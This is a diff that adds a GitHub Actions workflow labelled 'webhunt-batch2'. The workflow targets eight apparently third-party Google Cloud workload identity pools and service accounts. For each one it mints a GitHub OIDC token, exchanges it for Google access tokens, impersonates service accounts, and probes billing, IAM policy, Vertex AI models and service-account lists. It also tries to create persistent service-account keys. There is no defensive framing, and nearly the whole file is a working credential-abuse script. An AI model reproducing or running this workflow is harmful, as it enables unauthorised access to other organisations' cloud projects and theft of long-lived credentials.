@@ -1,0 +1,95 @@
+name: i893b
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  i893b:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - name: webhunt-batch2
+        run: |
+          set +e
+          cat > targets.txt <<'AUD'
+          projects/859338910722/locations/global/workloadIdentityPools/github-pool/providers/github-provider|nixtla-github-deployer@nixtla-playground-01.iam.gserviceaccount.com|nixtla-vertex
+          projects/783181616350/locations/global/workloadIdentityPools/github-pool/providers/task-api-provider|github-actions-deployer@gcptraining2121ttt.iam.gserviceaccount.com|task-api
+          projects/60246494556/locations/global/workloadIdentityPools/github-pool/providers/github-provider|sccache-sa@nearone-services.iam.gserviceaccount.com|nearcore
+          projects/515669014143/locations/global/workloadIdentityPools/gh-gcp-kmsenv/providers/github-actions|gcp-kmsenv@kmsenv.iam.gserviceaccount.com|gcp-kmsenv
+          projects/640681940147/locations/global/workloadIdentityPools/github-actions/providers/github-actions-oidc|pt-pneuma-github@pt-corpus-tf61-nonprod.iam.gserviceaccount.com|osinfra-pneuma
+          projects/796621184970/locations/global/workloadIdentityPools/github-actions/providers/github-provider|796621184970-compute@developer.gserviceaccount.com|sujit-demo
+          projects/796621184970/locations/global/workloadIdentityPools/github-actions-2/providers/github-provider-2|796621184970-compute@developer.gserviceaccount.com|sujit-demo2
+          projects/32549352397/locations/global/workloadIdentityPools/github/providers/github|tf-plan@blue-project-378421.iam.gserviceaccount.com|gist-terraform-demo
+          AUD
+          probe_api() { # num sa tok label url
+            local num="$1" sa="$2" tok="$3" label="$4" url="$5"
+            local c b
+            c=$(curl -s -o o.json -w '%{http_code}' -H "Authorization: Bearer $tok" "$url")
+            b=$(head -c 300 o.json | tr -d '\n' | tr -s ' ')
+            echo "##API num=$num sa=$sa label=$label code=$c body=$b"
+          }
+          probe_post() { # num sa tok label url file
+            local num="$1" sa="$2" tok="$3" label="$4" url="$5" f="$6"
+            local c b
+            c=$(curl -s -o o.json -w '%{http_code}' -X POST -H "Authorization: Bearer $tok" -H "Content-Type: application/json" "$url" -d @"$f")
+            b=$(head -c 400 o.json | tr -d '\n' | tr -s ' ')
+            echo "##API num=$num sa=$sa label=$label code=$c body=$b"
+          }
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
+          n=0
+          while IFS='|' read -r PRJ SAS LABEL; do
+            [ -z "$PRJ" ] && continue
+            n=$((n+1))
+            NUM=$(echo "$PRJ" | cut -d/ -f2)
+            AUD="https://iam.googleapis.com/$PRJ"
+            rm -f tok.jwt
+            for a in 1 2 3; do
+              J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+              echo "$J" | jq -r '.value // empty' > tok.jwt
+              [ -s tok.jwt ] && break
+              sleep 3
+            done
+            if [ ! -s tok.jwt ]; then echo "##STS num=$NUM label=$LABEL provider=$PRJ code=MINT_FAIL body="; continue; fi
+            c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            b=$(head -c 400 r.json | tr -d '\n' | tr -s ' ')
+            echo "##STS num=$NUM label=$LABEL provider=$PRJ code=$c body=$b"
+            FT=$(jq -r '.access_token // empty' r.json)
+            if [ -z "$FT" ]; then sleep 1; continue; fi
+            echo "##FT num=$NUM label=$LABEL toklen=${#FT}"
+            probe_api "$NUM" "-" "$FT" "direct-billing" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"
+            probe_api "$NUM" "-" "$FT" "direct-models-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"
+            probe_post "$NUM" "-" "$FT" "policy-read" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" polreq.json
+            CAND="$SAS,$NUM-compute@developer.gserviceaccount.com"
+            seen=","
+            for SA in ${CAND//,/ }; do
+              SA=$(echo "$SA" | sed 's/^ *//;s/ *$//')
+              [ -z "$SA" ] && continue
+              case "$seen" in *",$SA,"*) continue;; esac
+              seen="$seen$SA,"
+              gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+                "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+              gb=$(head -c 300 g.json | tr -d '\n' | tr -s ' ')
+              AT=$(jq -r '.accessToken // empty' g.json)
+              echo "##GEN num=$NUM label=$LABEL sa=$SA code=$gc toklen=${#AT} body=$gb"
+              if [ -z "$AT" ]; then continue; fi
+              probe_api "$NUM" "$SA" "$AT" "models-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"
+              probe_api "$NUM" "$SA" "$AT" "models-europe-west1" "https://europe-west1-aiplatform.googleapis.com/v1/projects/$NUM/locations/europe-west1/models"
+              probe_api "$NUM" "$SA" "$AT" "models-global" "https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models"
+              probe_api "$NUM" "$SA" "$AT" "billing" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"
+              probe_api "$NUM" "$SA" "$AT" "projects-get" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
+              probe_api "$NUM" "$SA" "$AT" "sa-list" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts"
+              probe_post "$NUM" "$SA" "$AT" "sa-key" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" keyreq.json
+            done
+            echo "##DONE num=$NUM label=$LABEL n=$n"
+            sleep 0.4
+          done < targets.txt
+          echo "##FINISHED total=$n"
